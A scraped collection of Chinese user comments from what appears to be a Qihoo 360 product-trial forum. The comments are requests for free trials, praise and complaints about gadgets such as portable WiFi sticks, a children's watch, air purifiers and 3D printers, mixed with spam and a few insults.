什么时候能上市啊 ，支持 .0.0.0.0.0.0.0.0.0.0.
我是手机号注册的，就是为了表诚意，如果360不给个，就真大打击跟随360的信心了
求送一个试用
没有通过申请，想问下有机硅橡胶表带要是断了怎么修理
提交申请的时候还忘了一点建议：希望可以加入WAN口，连接网络插入智能电视可以做为高清互联网电视盒用，再结合360WiFi - 手机版app做为电视控制器，同时可以将手机和360云盘中的文档、图片、视频、音乐等映射到电视机上浏览播放。
功能有点局限了，还好没有开卖，要不然又败家了。 最基本的没有通话功能，有点厚，定位靠sim卡发送信息，功能很一般，不及智能手机或其它穿戴设备。 360的优势在于最早在儿童市场开发了这款产品，如果正式发售后有市场，很快更强大工程的产品就会来替代。 对360儿童卫士暂时是观望的态度，简单的功能暂时不能满足我。
那天预约了 也兑换了抢购码 但是抢购体验做的太差 不想小米的抢购有任何提示 倒计时之类的 一直显示的无货 根本没有抢购的气氛和体验 会让预约后等待抢购的用户从那种期待 等待 准备激动一下的心情变成莫名其妙到感觉只是被骗关注的龙套演员 就算做了抢购体验 没有抢到 做出让用户抢购但没抢到的体验也能体现出诚意 这次抢购活动全程参加下来 感觉问题很大 路由器的话不行加钱买其他牌子的也就算了。
这下手机有了电灯了，
太丑了，依旧不愿意带。
市场已经有卖的相关汽车OBD智能检测软件，功能都不完善，智能车载系统才起步
说实在的，不算太好用，曾经多么期待小米的产品，但最后才发现，360的，除了***机坑了以外，别的都很不错
我想用啊！没用过  体验体验吧！
爱奇酷，奇酷好，奇酷妙
希望有机会可以尝试下哦,看好你哟.亲,..
时尚大方，美观，期待啊。。
好喜欢,希望可以得到， 我想用啊！没用过 体验体验吧！   
好漂亮。非常的喜欢
好东西啊，360是可以信赖的
应该上市在京东，不论运费什么都比天猫好。而且我在京东买东西刚好免运费却没货！
支持奇酷，加油！ 
流弊，用这显卡，玩游戏都是屈才了
京东可以货到付款天猫不行
360前途无量啊，高科技一个接着一个。
一直都是360的忠实粉丝、电脑、手机全部都是全套360、支持360、希望可以得到一个、
小编，要选我呀
顶顶顶顶顶
个人认为这种设备很傻 影响手机外观
能再加个万向跑步机吗 做成Omni那样 
期待，不知道什么时候才出来
急需空气，急需新鲜空气。急需e-Air检测仪
其实我关注你好久了
怎么申请试用
顶顶顶顶顶顶顶顶顶顶啊   一定要选我啊  跪求了
好东西，都想要..
你是一直都插在手机上的吗？拍照的时候或者晚上才用！！我晕……
好高上大的产品，期待尽快上市就好了
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶
应该在家FM发射功能就棒了。。。
支持奇酷，就这一句话
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶 
可以看衣服里面的东西吗？你们懂得
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶 
看起来不错.不知需要?银子.
好东西顶顶顶顶顶
好东西顶顶顶顶顶
看起来感觉不错，很期待哦 
我也想要一个
@王锐斯我不是内部人
360出大招！~
可以试加超导体材料，通过微环境调控实现悬浮
大众化点的独轮电动车才2000出头点，高端的才刚上万。滑板的话两辆电瓶车的钱貌似小贵了点，应为不管怎么说也是极限运动的工具如果装了电瓶变成交通工具的话，极限运动的人不会需要应为操作的多样性没有了。而过高的价格的话又会和安全性不成正比，原本可以成为代步工具的东西就很多，价格一高市场占有力就会下来。
外观精致漂亮，而且功能齐全，质量也很好
搞个麻醉枪手表吧，社会太不安全要自我保护啊嘻嘻嘻嘻
放心科技发展很快的，我觉得这个东东要等到2015年底才出的话，以这个进度价格只会降不会升
价格太不理想,太贵
这衣服...容易产生家庭矛盾的，呵呵呵
可惜是不支持大多数机型 
顶个.......................................
为什么这里标的是3.9元 点击立即购买 就变成9.9元了
让评审组说一下 为什么2次都选这个人：asdfgh20031007  ，给个理由先！！！！  纯粹的广告
    关注已久,希望今早到手试用
太有创意了，不知什么时候可以买到！
超给力~~超期待~~顶起来先~~
那是你自己不给力，我基本上每次都能抢到东西
非常想拥有一个，体验一下带来的刺激 
国内还是买不到啊……
电源适配器不知多大？实现外挂移动硬盘最好输出是12V 2A的要不只能挂个U盘，当然你也可以单独为移动硬盘供电！
我看不错，可惜，买不到 
真的好棒，希望能早日在市场上买到
设计精美，美观，性能优良
一直听说随身WIFI，这次想用用看
我也是啊，快点出来吧
我看不错，可惜，买不到  
一直没中过,坚持中
求购买0.0
晚上还好白天比较显眼
外观不错，造型吸引  不知道U盘的速度是否 和平时U盘 快多少 期待 和wifi 发射功率是否达到穿墙效果期待中
360还提供了 急求修复 这个 方便我们做电脑 维护时 不用下载 不知道是否  可以这样   附带360急求功能 不知道 防止感染性病毒 在感染其他电脑 功能，防止写入
买给妈妈用了几天 还不错  比同事买的其他产品细节上还是有优势的O(∩_∩)O哈哈~
不明觉厉。
为什么我预约的9.9元3个买不了？标的是3.9元 点击立即购买 就变成9.9元了 ？
神呐，，，，，
什么时候开放购买啊！！！！
期盼中，有了360儿童卫士 2，我再也不怕孩子走丢了！
哈哈 最近奇酷好多超酷的好东西！
支持奇酷，支持奇酷。
非常期待产品面世，值得使用 
第一代就关注了 买了一个  女朋友的弟弟给霸占了， 希望入手一个新一代的质量如何，在推荐给朋友
功能介绍看得眼红，申请试用
坐等双4G 这个是单4G
我发现360是要崛起啊，看了这些产品，不论是外观还是构思设计都很好，只能用精致和完美来说。
中你妹啊，你全家中毒 啊，水货。。。。
日你大爷的，广告也不用这么假吧？360去死吧，果断删掉任何关于360产品！
我说 哪个试用报告是不是有点假？ 
我们需要的儿童只能手表不需要太多功能 ，多了反而不是儿童监护手表了，功能多了会引起孩子的好奇，这样还能够学习么？ 简单易用，接受短信，接电话，定位，声音别太大，要是孩子上课手表吵吵能上号课么？主要还有外观，要漂亮.
虽然几率很小，却一直在坚持，希望能够获得生活的惊喜！
这价格，，，如果去一个“0”我会考虑买的。。。。
这是个占楼的用户啊。
顶,好想用!!!!
好想试用......
好东西啊 申请试用 
希望能得到吧 
这个物件算得上是高端大气上档次啊！！！
想要  ！！！！！！！！多少钱呢？？？？ 
价格便宜就好。。。。
10年后  我会买的，
  发货过来给钱
东西不错，支持！
很好用的     存储大
喜欢这样的创意，谁是这产品的设计者啊，是哪里人？
确实需要这样的小东西，挺难得的，喜欢
什么时候能买到呀
现在WIFI越来越流行。而支持U盘的还是第一个。肯定很棒。。
赶脚还行。   这个价位还是能接受。
试用过后交钱吗？ 
希望申请成功。
哎呦，对于我这种天天找钥匙的人 真是大福音啊 
攜帶方便  不错
有实时对话功能会更完美！
游戏领域也开始越来越智能了。
这个东西开会，做展示，还是不错的。
这个儿子应该很喜欢
看做还不错
nn  nn  nn
哈哈 好假···
nn  nn  nn
我要模仿声音器
很喜欢360的产品，希望可以申请成功，谢谢！
不错额，很期待，能够成为试用者~！
 先买了一耳光360随身wifi，结果不小心放洗衣机里面洗坏了，免费申请了一个，希望能成功吧
一直都没有申请成功过，真希望能有一次机会！
哇塞  前段时间就在找这个东东  大爱啊
  外观漂亮  功能强大啊  赞
不是假的，我同样也得到了，应该是第一批得到的，要求在官网写试用报告，试用了一段时间，想写一些东西，并提供点建议，可是找不到地方啊，不知在哪提交，相比其他论坛，这里很乱---
骗人的玩意，假的！吹牛皮上天，没见真东西！不要脸的360
已经申请了，希望能被选中。从来没有选中过，是我的运气太差？
这个检测仪的外形总觉得像熨斗。。。
很喜欢360的产品，希望可以申请成功....万分感谢！
我也希望有实时对话功能。 
已经申请了，希望能被选中。从来没有选中过，是我的运气太差？ 
看到这个我心动了。哈哈，帅气的制作啊 
超喜欢  外观漂亮
外观漂亮 功能强大啊 赞 
外观漂亮 功能强大啊 赞 
外观漂亮 功能强大啊 赞  
外观漂亮 功能强大啊 赞  
支持奇酷，期待e-Air检测仪 。
希望能有分享手机3G网络给笔记本电脑用的功能
之前用过wifi2，希望这款带U盘的随身wifi功能更好。建议颜色再多一些，期待被选中。。。
只想说~~~~~一群。。。。。。。。。。。。。。。。。。。。。。此处省略160字
骗人的东西，心凉了
大师兄大师兄，保佑我一定选中，一定中
盼星星，盼月亮，一直等啊等，就是还不见发售，唉，头发都白了
不知道最终能够把价格做到什么程度 因为同类产品不算少  如果没有价格优势很难抢占市场
我只钱买了个2代土豪金，希望这次能中
用过一个，但还是有些设置上的问题，希望能中，就可以进行下比较了。
这个不错 急需要啊
不知道这东西的准确度有多高
什么时候发售哇
装电池么？还是啥
上街必备啊，扶老太太更要的必备物品，和汽车的记录仪有异曲同工之妙，未来中国人不可缺少的东西，鉴定完毕。
希望可以中
希望希望..... 
希望能中...
是0.009微米，不是0.009纳米，差1000数量级呢。
快出吧！！！！！！
……我也是……
刚开始出随身WiFi的时候，就买了360随身WiFi，还是一代的。。。。
好贵啊，买不起
感觉效果并没有手机自带的闪光灯好。效果图里面，远不如5S自带的闪光灯色彩真实！ 只不过对于IPAD这种没有闪光灯的是一大救星！
很不错嘛，造型新颖，就是太贵了
一个字，赞。二个字，专业。三个字，真牛B!!
期待360的更多产品。
!!!!!!!!
太吊人胃口了，好东西自然有市场，敞开来卖撒！
不错，很有实用价值
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶 
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶 
跪求了跪求了
基本上对360wifi系列产品是随时关注吖，从360随身wifi1代开始就买来用，后来出了2代，跟小伙伴差不多把颜色集齐了，不期待能召唤出神龙，只期待能让我中一次免费试用。继续期待新品的出现，另外，wifi U盘和wifi 4G版能不能也来个炫彩系列吖？
接口太老 现在都用迷你了 闪电口
等了这么久还没正式开卖吗 期待中
希望能中，不然就得买了 
从过滤的材料来说，与一般的，或者是好品牌的差别不是很大。除了外观，除了开启方式而已
不错！方便的机器
给力的玩意
好用，希望改进发热的现象
能不能试用
去淘宝啊！！！！！！！！！！！！
跟普通手表很像啊。
哇塞！你的钢铁侠哪里买的~
我还以为只是我电脑插口有问题  原来插口发热是常见的现象啊
价格目测。。。
很拽的东东，会热卖
定位最准的儿童手环~
不知道真实亮度如何
只要19.9 我秒杀了。
我等这个等了很久了，希望能中！！！顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶！！！
360所有应用都密切关注，一有消息，马上知道！！！希望能中啊啊啊！！！求你了奇虎360 奇酷网！！！跪求呀！！！
绝对顶，不中就得买了55555 
期待啊。希望能用。
你是360内部人员么？注意回避一下啊。怎么几次都有你？
好啊，比之前我购买的360WIFI2要好看的多了，希望360越来越强！
我的360WIFI2好像有时候与手机无法匹配，一直在研究ing、
非常期待360随身u盘版。
好像要一台
希望我可以被抽中~
现在京东有的卖，199元，我是安徽的，没有货，是不是又是饥饿营销呀？ 
方便、快捷、实用的好东东，很期待能中一次，都申请好几次了
看了介绍感觉好牛逼。这显卡是用来珍藏的吧！？太贵了，都可以配一台很好的电脑了
非常期待试用，但愿被抽中。
真的好好噢！好想有一个，有点小私心。
但愿被抽中
加油 支持个 ~~~做过同类产品的评测。
什么情况这是？360的产品怎么跟小米搞到一块了？？？？？？
希望能够申请的到 让我见识到360强大的地方
来个运动健康型的创意产品吧，谢谢
妙笔生花，大师。
哇靠，来一台，我放在车上，车里的味儿重啊 ！！
安全路由器有闲置转让言传一声，转让给我 
果壳路由也有触摸屏，还更好看了 
又是饥饿营销
好东东啊，抽中我吧，
哇 这个真的不错  呵呵  希望可以试用  耶
样式需要改进一下 至少这个按钮应该设计在背面或者侧面   整体样式可以设计成一个漂亮一点的吊坠  这个说实在的 有点不好看吧  
两辆电动车的价格啊ORZ……，表示一辆电动车都买不起
这个是多少钱？
这种类似的淘宝已经有卖了啊，技术已经成熟了吧，为啥还在研发中
我很想试用一下，希望可以申请到，抽中我吧
希望可以申请到，抽中我吧 
我也要  必须得要 留一个哈
什么是双4G和单4G啊 ，小白。不懂、
不知多少MONEY，想入手一枚
很好的样子啊
感觉没什么用、
这个耗电严重么？
只要便宜实用就好
好贵啊！就是个无线wifi上网卡贵成这样哎，都是傻子，淘宝上网卡多的去了，而且即使是4g网速还不是要购买流量啊！！！
非常想试试·~~~阿门~
买不到只能够神奇使用来碰碰运气了
.... .
希望把云盘也合在一起那就更好了
虽然几率很小，却一直在坚持，希望能够获得生活的惊喜！ 
期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待
外观也还行吧
好用么？我也想要一个。，
市场上已经有类似的同类产品很多，我已经买了两三种，效果都不好，主要问题：一是报警不灵敏，经常误报，超设定距离范围不报警，未超设定距离有时也报警；二是报警的声音太小，有时在嘈杂的环境根本听不到。希望360在这两方面要加强，不然就失去它存在的意义了。
感觉还可以，但是用洗衣机不是因为洗衣服麻烦是因为没时间 啊
好棒的样子...
本人无止境的支持360的所有产品，希望好产品越来越多
360WIFI买了几个都很不错，比百度好多了，希望360的产品越来越好，越来越多，方便我们的生活!!!360改变生活!!
天上会掉馅饼吗？
期待中  》》》》》
赞！！！！！！！！！！！！！！！！！！！！！
刚才是测试。250美元的价格还是不错的，具体还是要看打印的材质和颜色，尺寸。
因为希望小，所以要是能得到会是一个很大的惊喜！
什么时候可以预定哇 
好强大..
降价就好了....
求价......
为什么是只能分享新浪微博呢
开来这货还分高配合低配啊！
太贵了扒...
求价....
求价...
价格ok的话....会热销的
很赞！！！
看着就很贵...
衷心喜欢寄给试用机会！！
希望可以得到
衷心希望奇酷网寄给试用机会！！ 
这个东西跟了很久了还没有出呢，还有那个安全防卫的东西！ 
没啥大用  觉得很一般
以后钱包也得充电了~~~~
电池会不会小了点？如果电量能大些那就几乎完美了！！
哇塞~评测写的好详实！
希望越小，失望越小，惊喜越大，持续关注》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》
新产品，新创意
有的，10T
最期待，再升级
应该可以设置简单通话功能，在紧急的情况下可以直接和大人通话，这样才有好的效果，小孩子小孩子，那么小的孩子在危险情况下哪有处置能力，肯定会想在第一时间找到自己的妈妈或者是爸爸。
多少的产品啊。期待售卖。一定给孩子买一个。加油360.
多好的产品啊。期待售卖。一定给孩子买一个。加油360. 
这是神马东西啊。没看出来怎么用啊。
毛毛熊的报告不错
  产品包装，我先说下运输包装，整整三层，外面还用了塑料带子，里面填充了不止2层的珍珠棉，保护的相当好！  外形上表面珍珠白是烤漆的质感，很大气，后背出风口也组合的非常好，看上去很美观。 体验~~  
因为报告不能修改了 ，补充在这里： 风量我要说的四档的话非常的大，出来的风吹着我的头发简直可以拍写真了哈哈~~~能很强劲的达到快速净化和循环的作用，但是声音也略大~~这个风量只适合白天。不过有一点要说，换成最低档的风速则非常的静音根本不会影响睡觉！ 
更换过滤网这个过程非常的简单便捷，磁力门的设计是我非常喜欢的，一开始看说明书要拆开正面面板，我脑袋里浮现的就是各种复杂，但是实际操作就跟开冰箱门一样，超级顺滑！非常时候我这种小白一样的家庭妇女，哇咔咔~~~
我其实还给过滤网做了特写，正面白色非常细密，我在想如果空气不佳过滤网拆开一定会非常的脏吧！它就是第一道的空气卫士，隔绝大颗粒物或者狗毛~~然后背面的一层犹如1200目的沙皮，绝对是阻隔pm2.5的高手！ （对不起大家我不能po图，是我因为各种事情拖延症自己导致的，也对不住小编了~~~再次道歉）
最期待，再升级 
喜欢！买回来可以做一些小东西！
深圳二乘三科技技术有限公司是3D systems公司在中国指定代理商，主要有CPX 3510 珠宝喷蜡机，PROJET 1200桌面打印机，3510 HD 树脂打印机类。PROJET 1200主要适用于个性定制，个人设计等。如果有需要请联系公司销售部谭先生，联系电话13827424853
深圳二乘三科技技术有限公司是3D systems公司在中国指定代理商，主要有CPX 3510 珠宝喷蜡机，PROJET 1200桌面打印机，3510 HD 树脂打印机类。PROJET 1200主要适用于个性定制，个人设计等。如果有需要请联系公司销售部谭先生，联系电话13827424853 
期待新产品，360越来越给力了 :D 
希望可以得到
已分享，待中奖~
1.可以配成对，即可和手机联系，双方还可以相互感应。 2.一定要加振动，不然在吵闹的地方很难听到声音。
带投影功能的移动电源，这不错
wifi直接和服务器连接，完成指定任务。
奇酷，我挺你
让我中一回吧！五百万的彩票都错过了，这个绝对不能错过
支持奇虎360，加油↖(^ω^)↗
什么时候发售？我等到花儿都谢了！
看起来很好的样子
确实很好的东西，就不知道是否有机会能使用并且评测呢！期待~
这个产品不错啊，能试用吗？
什么时候可以买啊
游戏领域也开始越来越智能了。
从来不会去买的。。。
一般人买不起
你这名字估计难。
为什么我预约的9.9元3个买不了？标的是3.9元 点击立即购买 就变成9.9元了 ？  
这个太实用了，最近正缺个U盘！希望中奖
喜欢！买回来可以做一些小东西！ 
喜欢！买回来可以做一些小东西！ 
喜欢！买回来可以做一些小东西！ 
可惜是不支持大多数机型  
可惜是不支持大多数机型  
兼容性咋样
还有价格方面
喜欢！买回来可以做一些小东西！ 
喜欢！买回来可以做一些小东西！ 
喜欢！买回来可以做一些小东西！ 
盼星星，盼月亮，一直等啊等，就是还不见发售，唉
希望能开发语音功能，紧急的时候宝宝可以用儿童卫士与大人沟通。
手表外形很酷~！
二代的外观舒服多了
好想试试啊
啥时候开卖啊？
高端大气啊
呵呵，这真的很好呢，希望我能中哦
这个好像不是很稀奇吧，我买的喜德盛电动自行车和这个差不多，而且个人认为应该比这个轻不少
额，电子产品的更新换代已经是我等大叔追赶不上的啦，希望能有款够用、成熟、稳定、不是处在时尚浪尖上的智能手表，够用就可以了，不必象追赶青春的尾巴般，迷失挣扎在多变的时尚中
申请很多次了，都没有试用到，一如既往的支持360
申请很多次了，都没有试用到，一如既往的支持360 
快给我个吧
支持奇虎360，加油↖(^ω^)↗ 让我中一回吧！五百万的彩票都错过了，这个绝对不能错过  
喜欢喜欢喜欢
我的手办有着落了，哈哈哈哈哈
这款产品等好久了       终于要出来咯                  希望能领到                                 领不到就买一个
自己设计的？ 
顶！脚踩或者手压的更方便啊！
好想要啊  不知道能给个试试吗？？？？？？？？？？？？
比起一代来，二代更人性化，也更可爱，像手表了
急想使用！
绝对比中兴九城的好，中兴九城就一半成品，要游戏没游戏，要内容没内容。TCL T方游戏机目前已经有130多款游戏了，每周都有更新游戏数量，每月固定至少10款大型正版游戏上线。手柄还独具一键适配功能，操作非常简单。
打印3D美女啊。。。
给老人不错，放床头，万一有事，一按就行了。
xbox,ps4多少钱，TCL T方游戏机多少钱？连他们个零头都不到，这怎么能放一起比较呢。普通人家庭使用，只要不是发烧级游戏玩家，这个设备足够了。看视频，玩游戏都挺不错滴~~
目前TCL T方游戏机自有的ATET游戏平台上已经有130多款游戏了，这个游戏数量是不断更新的，而且每个月还有10款精品大型游戏上线。年底到300款应该不成问题。而且只要是安卓游戏，大部分是可以适配的，只是他们平台上都是他们精选并且做了一键适配的处理。玩起来更爽，操作更简单就是了
请问为什么不标价格？？？
感觉好棒！
太牛逼了，一定要有，买也行啊
牛逼啊，一定偶要有 ，买一个买也行
不错，支持360的产品 就是有创意
很想拥有，可惜无金
好像要一个
太强了，光想象都不知道衣服怎么洗的，好奇，期待总…… 
想要哟。嘻嘻
赞一个。。。 这个必须赞。。。。。
可以用两个营运商就是双4G 只能用一个就是单4G
要多少银两
你的意思是说一代不像手表、
真帅气，上档次
高智能，跟不上了 
好东西 非常喜欢 
太强大了 喜欢 好东西
做梦都想得东西  创造梦想的神器
神器呀 好东西 做梦了 我有一个该多煊呀
什么时候有得买啊 
很好奇耶，希望可以试试
好东西  太想要了 怎么办呀
我买到了。。。
起来很好，希望可以试试
木有，看到一半看不下去了，不过很用心，赞一个
这设计出来是给人观赏或收藏的吧 一般人谁会去买 
暂时没有与您相关的评论
O(∩_∩)O~  还是兼容问题就像很多现有的穿戴产品一样不兼容的机型多了 
不错额，很期待，能够成为试用者~！
正打算买这么一个东西，手机实在太容易丢了。
不知道得多少钱，希望能 便宜点
没看特别懂
没特别懂，不过感觉挺好玩的
那天才能开始卖呀！网上连消息也设有？卖提醒一下撒。
期待啊，让人直流口水，qikoo.360我爱你们
感谢大师指点
希望可以申请成功吧 不能成功也只能买一个了。。
嗯，以后更精彩。
我想要，唉，啥时能免费试用啊，好像成为试用者。360，我赞你，我顶你，我求你
希望APP的开发，不要忽略了WP系统
很不错的报告
额额鹅，迫不及待
我今天终于有了！！！！！
360如此强大，一如既往的支持360.。。。
希望能够获得试用
如果能打印金属不知道是否要逆天了
RMB300元 够买个漫步者了。好吧要的就是新奇特
希望能够获得试用 ， 谢谢！  支持360！
试用就是想***看看工程机的效果。
希望发挥更多功能，。
希望能够获得试用 ， 谢谢！ 支持360！ 
看上去相当不错，是科技智能猫眼，也可称之为触发摄像头。我期待试用！
看起来很牛的样子！
我抢了2个U盘！这U盘功能很强大很喜欢！写入速度几M一秒！可以当做wifi！发射信号！还可以切换无线网卡模式！接受信号！才40元！！买了网卡或者U盘+起来都不值这个价格！
看上起很漂亮
看着可能不太实用啊
外观设计不错，但厚度有很大的改进空间 
什么时候能预约啊 家里路由坏了
支持360，我已经在用360wifi一代，不知这款360wifi是不是比一代更牛。 期待啊
能不能不搞饥饿营销啊？
我也要，支持360
希望能用上
30块以下可以接受的说。。。
不能算贵了，电子设备从来都是越小越贵，越薄越贵，这东西比电动车要小得多，要求的科技含量自然大得多，价格高一点也实在正常！
上期失败了，可能是没有提供好的功能建议吧！唉！
我想试用，上次抢购没赶上，希望这次能得到。
199美元又250美元是什么意思..
什么时候有的买啊
我学得中国人应该用人民币，所以199后面就应该是元，而非美元！
愿所以有的人都爱国！！！！
这就是传说中的“智能”家居吧？！很期待……
很是有的期待的啊！
这个感知的！
是很不错的！
嗯  很不错 的确方便了 
碉堡了！360无线wifi。看着就想买
智能U盘，值得期待！
哈哈哈  大家都希望 ！  阿么   我希望我也中  (*^__^*) 嘻嘻……！
求抽中！求抽中！抽中我一定写份完美的报告！我一般都很倒霉，希望能人品爆发！
很喜欢哦。
这个摄像头应该在4G的网络使用
应该送我个生日礼物、
拆机喜欢！！！支持LG
唉，头发都白了 
给个消息吧，什么时候再发售？不然我去买极路由了.....
创意好，功能强大，期待中。。。。。。
非常期待啊，如果价格更低一些就好了啊。
力挺，求能筛选到我
阿么 我希望我也中 (*^__^*)
100RMB以下可接受 好想要一个！~-~
奇酷，我挺你 
希望能中啊 
这个还是概念款吧
我一定能中，我是一名学生，为满足我的好奇心我一定能中
打印体积呢？
配有800瓦的加热线圈可对水进行加热，螺旋器会将水传送到食物周围，实验室级别的温度计会随时记录食物温度。真心不错的厨房智能硬件哦，赞一个！
网上有的，去看
还不如360儿童手表
什么时候，什么时候啊？等的花儿都谢了
大家请看    MOD-t 3D打印机
我赞一个哦，请看   MOD-t 3D打印机
艾玛，求中！  
近视能玩吗
要钱吗？？
360真是越来越强大了。加油  感觉外观在改进下就更好了
打印材料有没有特定要求？能否镂空打印？
如果真能不限制打印材料，各种样式都能打印，还真想要一台
如果有摄像头更好！
不错，应该入手！
高端大欺上档次！
永远都是360忠实的关注者
貌似很不错哦  就是贵了些...
智能U盘，值得期待！ 
会不会有侵犯人家营私权？
或许可以啊，可以看你自己。
智能U盘，值得期待！永远都是360忠实的关注者 
怎么实现减震效果
这……是不是托！家里竟然有这么多净化器！！！
相当期待，真心想拥有，家里的噪音可以减少了 
这个检测仪的外形总觉得像熨斗。。。 
希望360随身WiFi U盘版能给更多消费者带来更大方便，在原有的空间上
大家都也一样。。。我也希望我中，马上中奖！
中吧……很喜欢数码产品
买个手电筒  用
伤不起啊，  
唉，中得几率太小了！
其实我申请试用就是为了跟我手上的一款D-LINK产品做对比。
快点公开卖吧
很希望自己能够中一次，体验一下360的新产品~~
额.....0.0 
你倒是快点卖啊
933.2888！不是几千？？？
这个比较高 
很希望自己能够中一次，体验一下360的新产品。
路过，看看热闹！！！ 
360我的热衷！
我也希望中一次
我的手机是Windowsphone8，没有360智键的软件啊！希望360研发适合wp8或wp8.1的啊！
多少钱可入手 ？？？？？？？？？？？
奇酷就是新奇啊，很有创意。
第一次申请，很是期待
很希望自己能够中一次，体验一下360的新产品。 
造型好看，还是镂空设计，好像还带液晶屏吧，太酷了。比我以前的镂空表好多了！
好产品，好市场，好喜欢，好想要，都好才是真的好。
你在梦里可能会实现
高富帅和土豪的玩具~
一直很期待360官方产品的说，以前都是买的，U盘版的没抢上，所以第一次申请，超级希望能中！期待ing
天天嚷着要公开发售，官网本来说6月公开发售，现在官网又改成公测中，我没想着有多好的运气能中签***，我就老实等着你公开发售，但天天狼来了，只会让人觉得厌烦，
不错，给力
喜欢便宜些 能大众化些。、、
简单一句话~~喜欢360，信赖360~~
感觉内存小了   16G就好了
天猫商城有现货为什么要预约抢购？？？360可不能自毁形象啊！
I Love 360
我等了一年了！周鸿伟去你的！你就是个孙子还学雷军！你笨的像🐷！懂吗！在不发布！别玩硬件了！还是雷军来搞！你还是搞你软件！要不老子鄙视你！kkkk
500多元啃爹啃全家啊
价钱不能接受
很好啊，3个功能。
我需要联通3G版
看起来真好
什么时候开卖啊！速度！
敢再多点参数吗
希望中奖。
奇酷，奇酷，奇怪的造型，飞酷的感觉。让人类心理无比感动
你倒是快点卖
操作是否简单，耗材贵不贵啊
希望内存再大一下，可不可以考虑10个GB的
第一次申请好期待
等了好久了 都出第二代了。。。还没见到第一代发售
这个高端大气上档次的产品还想烫斗啊！
32g的合适
期待360和三星的合作
闪存在大点要是在出个16g或者32g的就好了。。。最好出个移动硬盘充电宝在带随身WIFI支持3G和4G。。哈哈哈哈
嗯！感觉做得越来越好了，期待下一个惊奇的东西出来。
额，这有什么压力感觉的。。。
是不是弄个大件来测试下~~
不错，之前的买亏了？ 
这个可以有
笔头太短了吧
要不我直接买一个算了，估计不会抽到 
哪里有卖啊 
有使用的没有 
360越做越好，力挺！！
优酷上见过 
造型现代感强烈，这点便于存放，电池应该是锂电吧！
把360随身WiFi结合进去
我也想要，抢不到
